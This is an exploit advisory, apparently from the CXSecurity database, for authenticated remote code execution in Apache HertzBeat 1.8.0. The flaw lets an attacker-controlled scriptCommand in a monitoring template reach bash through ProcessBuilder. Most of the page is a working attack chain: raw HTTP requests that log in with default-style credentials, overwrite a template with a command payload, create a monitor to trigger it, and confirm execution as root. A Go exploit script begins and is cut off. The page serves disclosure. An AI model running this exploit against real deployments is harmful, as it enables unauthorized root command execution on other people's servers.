---
title: Apache HertzBeat 1.8.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026050015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-19
fetch_date: 2026-05-20T05:58:32.055563
---

# Apache HertzBeat 1.8.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache HertzBeat 1.8.0 Remote Code Execution** **2026.05.19**  Credit:  **[Brett Gervasoni](https://cxsecurity.com/author/Brett%2BGervasoni/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

# Exploit Title: Apache HertzBeat 1.8.0 - Remote Code Execution
# Google Dork: N/A
# Date: 2026-03-09
# Exploit Author: Brett Gervasoni
# Vendor Homepage: https://hertzbeat.apache.org/
# Software Link: https://github.com/apache/hertzbeat/releases
# Version: 1.8.0
# Tested on: Linux (Docker; official HertzBeat image, uid=0 in container)
# CVE: N/A
================================================================================
METADATA
================================================================================
Severity: CRITICAL
Impact: Arbitrary command execution via monitoring template (script protocol)
CWE: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
Product: Apache HertzBeat — https://hertzbeat.apache.org/ (v1.8.0)
Affected Component: ScriptCollectImpl.collect()
Affected Endpoint: PUT /api/apps/define/yml
Authentication: Required (standard user or admin)
Note: Apache Security does not classify this as a vulnerability; see HertzBeat
security model: https://hertzbeat.apache.org/docs/help/security\_model/
================================================================================
VULNERABILITY SUMMARY
================================================================================
HertzBeat allows arbitrary OS commands to be executed via the scriptCommand
parameter in a monitoring template definition.
An authenticated user can overwrite a monitoring template definition via
PUT /api/apps/define/yml. The "define" body contains YAML parsed into a Job.
When the YAML specifies protocol: script, the attacker-controlled scriptCommand
string is passed to ProcessBuilder (bash -c "<command>") without sanitization.
If the overwritten template has active monitoring instances, updateAppCollectJob()
re-dispatches them, triggering execution within seconds. If none exist, the
attacker can create one via POST /api/monitor to trigger immediate execution.
The default Docker deployment runs the process as root (uid=0).
================================================================================
VULNERABLE CODE (REFERENCE)
================================================================================
Sink — ScriptCollectImpl.java (approx. lines 74–114) — direct execution:
public void collect(CollectRep.MetricsData.Builder builder, Metrics metrics) {
ScriptProtocol scriptProtocol = metrics.getScript();
// ...
if (StringUtils.hasText(scriptProtocol.getScriptCommand())) {
switch (scriptProtocol.getScriptTool()) {
case BASH -> processBuilder = new ProcessBuilder(
BASH, BASH\_C, scriptProtocol.getScriptCommand().trim()); // payload
// ...
}
}
// ...
Process process = processBuilder.start(); // executed
}
YAML gadget blocking — AppController.java (approx. 55–59) — blocks SnakeYAML
gadget strings, not shell command injection:
private static final String[] RISKY\_STR\_ARR = {"ScriptEngineManager", "URLClassLoader", "!!",
"ClassLoader", "AnnotationConfigApplicationContext", "FileSystemXmlApplicationContext",
"GenericXmlApplicationContext", "GenericGroovyApplicationContext", "GroovyScriptEngine",
"GroovyClassLoader", "GroovyShell", "ScriptEngine", "ScriptEngineFactory",
"XmlWebApplicationContext", "ClassPathXmlApplicationContext", "MarshalOutputStream",
"InflaterOutputStream", "FileOutputStream"};
================================================================================
PROOF OF CONCEPT — RAW HTTP
================================================================================
Replace TARGET with the HertzBeat host. Default port is 1157. Example uses a
standard user "operator" / "hertzbeat" (user role); admin with default
password also works.
--- Step 1: Authenticate ---
POST /api/account/auth/form HTTP/1.1
Host: TARGET:1157
Content-Type: application/json
{"type":1,"identifier":"operator","credential":"hertzbeat"}
Response: data.token (JWT) — use as Bearer below.
--- Step 2: Overwrite linux\_script template ---
PUT /api/apps/define/yml HTTP/1.1
Host: TARGET:1157
Authorization: Bearer <JWT>
Content-Type: application/json
{"define":"app: linux\_script\ncategory: os\nname:\n en-US: Linux Script\n zh-CN: Linux Script\nparams:\n - field: host\n name:\n en-US: Host\n zh-CN: Host\n type: host\n required: true\nmetrics:\n - name: basic\n i18n:\n en-US: Basic\n zh-CN: Basic\n priority: 0\n fields:\n - field: result\n type: 1\n i18n:\n en-US: Result\n zh-CN: Result\n protocol: script\n script:\n scriptTool: bash\n charset: UTF-8\n scriptCommand: id > /tmp/pwned\n parseType: multiRow\n"}
Decoded define (YAML):
app: linux\_script
category: os
name:
en-US: Linux Script
zh-CN: Linux Script
params:
- field: host
name:
en-US: Host
zh-CN: Host
type: host
required: true
metrics:
- name: basic
i18n:
en-US: Basic
zh-CN: Basic
priority: 0
fields:
- field: result
type: 1
i18n:
en-US: Result
zh-CN: Result
protocol: script
script:
scriptTool: bash
charset: UTF-8
scriptCommand: id > /tmp/pwned
parseType: multiRow
Expected response:
HTTP/1.1 200 OK
Content-Type: application/json
{"code":0,"msg":null,"data":null}
--- Step 3: Create monitor (if no linux\_script monitors exist) ---
POST /api/monitor HTTP/1.1
Host: TARGET:1157
Authorization: Bearer <JWT>
Content-Type: application/json
{"monitor":{"name":"rce-test","app":"linux\_script","host":"127.0.0.1","intervals":30,"status":1},"params":[{"field":"host","paramValue":"127.0.0.1","type":1}]}
--- Step 4: Verify (example: Docker) ---
docker exec hertzbeat cat /tmp/pwned
Expected:
uid=0(root) gid=0(root) groups=0(root)
================================================================================
EXPLOIT CODE — script\_command\_rce.go (Go)
================================================================================
package main
import (
"bytes"
"encoding/json"
"fmt"
"io"
"math/rand"
"net/http"
"os"
"strings"
)
const target = "http://localhost:115...